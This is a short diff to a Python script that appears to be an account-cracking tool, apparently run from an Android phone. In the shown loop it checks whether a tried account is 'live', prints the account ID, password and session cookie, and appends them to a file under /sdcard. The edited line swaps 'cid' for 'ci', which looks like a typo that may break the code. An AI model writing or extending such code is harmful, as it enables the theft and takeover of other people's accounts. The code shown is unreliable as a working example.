@@ -1364,7 +1364,7 @@ def p(uid,pwx,tl):
                 check = check_lock(cid)
                 if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        print(f"{cyan}(ATOM-NV){ci}|{pw}")
                         print(f"{cyan}Cookie : {cyan}{coki}")
                         open("/sdcard/ATOM-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
                         break
